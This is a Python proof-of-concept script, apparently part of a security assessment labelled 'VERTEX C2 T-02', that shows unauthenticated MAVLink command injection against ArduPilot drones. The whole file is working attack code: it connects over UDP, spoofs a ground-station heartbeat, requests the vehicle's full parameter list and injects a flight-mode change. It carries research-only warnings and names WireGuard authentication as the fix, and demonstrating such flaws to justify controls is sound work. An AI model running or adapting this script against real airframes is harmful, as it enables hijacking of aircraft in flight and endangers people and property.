#!/usr/bin/env python3
"""
VERTEX C2 — T-02 Proof of Concept: Unauthenticated MAVLink Command Injection

Demonstrates that any host with network access to UDP/14550 can inject
commands to an ArduPilot-based airframe with no authentication required.

Usage:
    python3 inject.py --target 127.0.0.1 --port 14550

WARNING: Research use only. Never run against systems you do not own.
"""

import argparse
import time
from pymavlink import mavutil


def connect(target, port):
    print(f"[*] Connecting to MAVLink endpoint {target}:{port}")
    conn = mavutil.mavlink_connection(
        f"udpout:{target}:{port}",
        source_system=254
    )
    print("[*] Waiting for heartbeat...")
    conn.wait_heartbeat(timeout=10)
    print(f"[+] Heartbeat received — system {conn.target_system} "
          f"component {conn.target_component}")
    return conn


def inject_heartbeat(conn):
    """Send a spoofed heartbeat to establish presence on the link."""
    conn.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_GCS,
        mavutil.mavlink.MAV_AUTOPILOT_INVALID,
        0, 0, 0
    )
    print("[+] Spoofed heartbeat injected")


def inject_request_params(conn):
    """Request all parameters — demonstrates read access to vehicle config."""
    conn.mav.param_request_list_send(
        conn.target_system,
        conn.target_component
    )
    print("[+] Parameter list request injected — reading vehicle config")


def inject_set_mode(conn, mode="STABILIZE"):
    """Attempt to change flight mode — demonstrates command injection."""
    mode_id = conn.mode_mapping().get(mode)
    if mode_id is None:
        print(f"[-] Mode {mode} not found")
        return
    conn.mav.set_mode_send(
        conn.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id
    )
    print(f"[!] Flight mode change injected: {mode} (id={mode_id})")
    print("[!] On a live airframe this would change vehicle behavior")


def main():
    parser = argparse.ArgumentParser(
        description="VERTEX C2 T-02 — MAVLink injection PoC"
    )
    parser.add_argument("--target", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=14550)
    args = parser.parse_args()

    print("=" * 60)
    print("VERTEX C2 — Unauthenticated MAVLink Injection PoC")
    print("Research use only")
    print("=" * 60)

    conn = connect(args.target, args.port)
    time.sleep(1)

    inject_heartbeat(conn)
    time.sleep(0.5)

    inject_request_params(conn)
    time.sleep(0.5)

    inject_set_mode(conn, "STABILIZE")

    print("\n[*] Injection complete")
    print("[*] T-02 demonstrated: no authentication required")
    print("[*] Control: WireGuard peer key auth closes this vector")


if __name__ == "__main__":
    main()
